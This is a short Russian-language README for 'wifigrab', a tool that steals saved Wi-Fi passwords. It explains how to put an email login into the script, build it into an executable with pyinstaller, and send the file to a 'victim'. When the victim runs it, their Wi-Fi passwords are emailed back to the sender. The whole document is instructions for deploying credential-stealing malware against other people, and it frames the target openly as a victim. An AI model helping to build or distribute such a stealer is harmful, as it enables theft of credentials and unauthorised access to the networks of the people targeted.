# wifigrab
Получите Wifi пароли через запуск приложения

# Как использовать

Перейдите на [эту страницу](https://myaccount.google.com/lesssecureapps) и разрешите доступ небезопасным приложениям.

Установите [Python](https://python.org/downloads)

Скачайте этот репозиторий через кнопку Code/Download from ZIP

Разархивируте архив и перейдите в папку wifigrab-main

Откройте файл wifigrab.py и измените переменные login и password на логин и пароль соответствено.

Откройте командную сторку и напишите

```
pip install pyinstaller
python build.py -S wifigrab.py
```

Переходите в папку dist.

Получившийся файл скидивайте жертве. Когда она его откроет вам на почту прийдёт письмо с паролями от wifi
